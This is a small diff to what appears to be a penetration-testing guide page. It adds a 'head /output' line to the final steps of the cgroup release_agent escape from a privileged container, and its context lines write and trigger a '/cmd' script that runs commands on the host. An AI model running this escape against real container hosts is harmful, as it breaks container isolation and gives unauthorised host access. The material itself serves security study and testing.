@@ -35,6 +35,7 @@ echo "ps aux > $host_path/output" >> /cmd
 chmod a+x /cmd
  
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+head /output
 ```
 {% endcode %}
 
